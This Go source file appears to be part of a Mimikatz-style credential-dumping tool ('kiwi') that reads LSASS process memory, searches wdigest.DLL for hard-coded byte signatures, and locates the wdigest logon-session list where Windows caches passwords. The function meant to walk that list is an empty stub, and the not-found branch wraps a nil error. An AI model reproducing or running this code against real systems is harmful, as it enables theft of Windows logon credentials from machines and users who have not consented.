package kiwi

import (
	"bytes"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
)

var (
	patternWin5X64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
	patternWin6X64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}

	patternWin64X86PasswordSet = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}

	wdigestReferences = map[uint32]*patchGeneric{
		buildWinVista: {
			search: &patchPattern{
				length: len(patternWin6X64PasswordSet),
				data:   patternWin6X64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 48},
		},
	}
)

func (kiwi *Kiwi) searchWdigestListAddress(pHandle windows.Handle) error {
	wdigest, err := kiwi.getLSASSBasicModuleInfo(pHandle, "wdigest.DLL")
	if err != nil {
		return err
	}
	// read lsasrv.dll memory
	memory := make([]byte, wdigest.size)
	_, err = api.ReadProcessMemory(pHandle, wdigest.address, &memory[0], uintptr(wdigest.size))
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about wdigest.DLL")
	}
	// search logon session list pattern
	patch := wdigestReferences[buildWinVista]

	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.WithMessage(err, "failed to search wdigest reference pattern")
	}
	address := wdigest.address + uintptr(index+patch.offsets.off0)
	var offset int32
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about wdigest list address")
	}
	wdigestListAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	kiwi.logf(logger.Debug, "wdigest list address is 0x%X", wdigestListAddr)
	return nil
}

func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, session *LogonSession) error {
	return nil
}
